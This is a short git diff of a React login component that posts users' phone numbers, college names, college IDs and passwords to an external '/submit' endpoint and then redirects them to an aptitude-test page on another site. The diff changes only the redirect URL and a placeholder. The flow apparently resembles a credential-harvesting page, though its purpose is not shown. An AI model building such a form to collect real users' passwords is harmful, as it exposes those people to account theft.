@@ -45,7 +45,7 @@ const Login = () => {
             const res = await axios.post('https://skillface.onrender.com/submit', finalData);
             console.log('Response:', res.data);
 
-            window.location.href = 'https://www.indiabix.com/logical-reasoning/number-series/';
+            window.location.href = 'https://www.indiabix.com/online-test/aptitude-test/random';
         } catch (err) {
             console.error('Login Failed:', err);
         }
@@ -74,7 +74,7 @@ const Login = () => {
                             name={field}
                             placeholder={
                                 field === 'ph' ? 'e.g. 1234567890' :
-                                field === 'college' ? 'e.g. NIT Durgapur' :
+                                field === 'college' ? 'e.g. IIT Bombay' :
                                 field === 'collegeID' ? 'Enter your ID' :
                                 'Enter your password'
                             }
@@ -104,5 +104,4 @@ const Login = () => {
         </div>
     );
 };
-
 export default Login;
